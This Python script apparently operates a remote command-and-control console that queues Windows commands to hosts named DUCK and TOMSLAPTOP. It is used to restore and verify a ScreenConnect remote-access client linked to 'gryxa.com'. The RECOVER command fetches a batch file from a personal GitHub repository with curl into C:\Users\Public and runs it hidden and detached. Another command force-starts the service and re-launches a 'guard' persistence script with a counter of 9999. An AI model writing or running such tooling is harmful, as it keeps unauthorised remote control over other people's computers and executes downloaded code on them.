#!/usr/bin/env python3
"""Bring DUCK + TOMSLAPTOP back on Gryxa via R3 recover; verify."""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()
HOSTS = ["DUCK", "TOMSLAPTOP"]

PROBE = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='SilentlyContinue'; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if(-not $s){ Write-Output 'GRYXA=MISSING' } else { "
    "$g= if($s.PathName -match 'gryxa\\.com'){'YES'} else {'NO'}; "
    "Write-Output ('GRYXA='+$s.State+'|PATH_GRYXA='+$g+'|START='+$s.StartMode) "
    "}; "
    "Get-Service -Name 'ScreenConnect Client*' -EA SilentlyContinue | ForEach-Object { "
    "Write-Output ('SC='+$_.Name+'|'+$_.Status) }; "
    "Write-Output 'PROBE_DONE'\""
)

START = (
    'sc config "ScreenConnect Client (36e506ff016b2151)" start= auto'
    ' & sc start "ScreenConnect Client (36e506ff016b2151)"'
    " & powershell -NoP -NonI -C "
    "\"$s=Get-Service -Name 'ScreenConnect Client (36e506ff016b2151)' -EA SilentlyContinue; "
    "if($s){'AFTER='+$s.Status}else{'AFTER=MISSING'}\""
)

RECOVER = (
    'start "" /min cmd.exe /c "'
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90"
    r" -o C:\Users\Public\gryxa_recover.cmd"
    " https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd"
    r" & call C:\Users\Public\gryxa_recover.cmd --detached"
    '" & echo RECOVER_R3_QUEUED'
)

LOGTAIL = (
    r"powershell -NoP -NonI -C "
    "\"if(Test-Path C:\\Users\\Public\\gryxa_recover.log){ Get-Content C:\\Users\\Public\\gryxa_recover.log -Tail 25 } "
    "else {'NO_LOG'}; "
    "$s=Get-Service -Name 'ScreenConnect Client (36e506ff016b2151)' -EA SilentlyContinue; "
    "if($s){'NOW='+$s.Status}else{'NOW=MISSING'}\""
)


def api(path: str, fields: dict | None = None, retries: int = 6) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    last: Exception | None = None
    for i in range(retries):
        try:
            req = urllib.request.Request(BASE + path, data=data)
            req.add_header("Authorization", "Bearer " + ADMIN)
            req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
            with urllib.request.urlopen(req, timeout=60) as r:
                return r.read().decode(errors="replace")
        except Exception as e:
            last = e
            time.sleep(5 + i * 3)
    raise RuntimeError(last)


def api_json(path: str) -> dict:
    return json.loads(api(path))


def queue(target: str, cmd: str) -> int:
    text = api("/cmd", {"target": target, "cmd": cmd})
    print(text.strip())
    m = re.search(r"id=(\d+)", text)
    if not m:
        raise RuntimeError(text)
    return int(m.group(1))


def wait_one(cid: int, timeout: float = 120.0) -> str:
    t0 = time.time()
    while time.time() - t0 < timeout:
        res = api_json(f"/api/cmd/{cid}").get("results") or []
        if res:
            time.sleep(3)
            res = api_json(f"/api/cmd/{cid}").get("results") or []
            return (res[0].get("out") if res else "") or ""
        time.sleep(6)
    return ""


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    fleet = api_json("/api/fleet")
    by = {h["host"].upper(): h for h in fleet.get("hosts") or []}
    for h in HOSTS:
        x = by.get(h, {})
        print(
            f"SIGHT {h}: presence={x.get('presence')} state={x.get('state')} "
            f"gryxa={x.get('has_gryxa')} beat={x.get('beat')}"
        )

    print("== live probe ==")
    status = {}
    for h in HOSTS:
        cid = queue(h, PROBE)
        out = wait_one(cid, 100)
        status[h] = out
        print(h, "=>", (out or "NO_RESPONSE")[:300].replace("\n", " | "))

    for h in HOSTS:
        out = status.get(h) or ""
        if not out.strip():
            print(f"{h}: offline for cmd — still queue R3 (picked up when agent returns)")
            queue(h, RECOVER)
            continue
        if re.search(r"GRYXA=Running", out, re.I) and "PATH_GRYXA=YES" in out:
            print(f"{h}: service Running locally — force start + guard kick (console lag?)")
            queue(h, START)
            queue(
                h,
                r">C:\ProgramData\WinRTCS\guard.cnt echo 9999"
                r" & >C:\ProgramData\WinRTCS\gryxa_boost.cnt echo 15"
                r' & start "" /min cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd'
                " & echo GUARD_KICKED",
            )
            continue
        if re.search(r"GRYXA=Stopped", out, re.I):
            print(f"{h}: Stopped — start first, then R3 if needed")
            queue(h, START)
            time.sleep(0.2)
            queue(h, RECOVER)
            continue
        print(f"{h}: MISSING/other — R3 recover")
        queue(h, RECOVER)

    print("wait 200s for R3")
    time.sleep(200)

    print("== verify ==")
    for h in HOSTS:
        cid = queue(h, PROBE)
        out = wait_one(cid, 100)
        print(h, "=>", (out or "NO_RESPONSE")[:280].replace("\n", " | "))
        if not out or "GRYXA=Running" not in out:
            cidl = queue(h, LOGTAIL)
            log = wait_one(cidl, 90)
            print("  LOG:", (log or "")[-400:].replace("\n", " | "))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
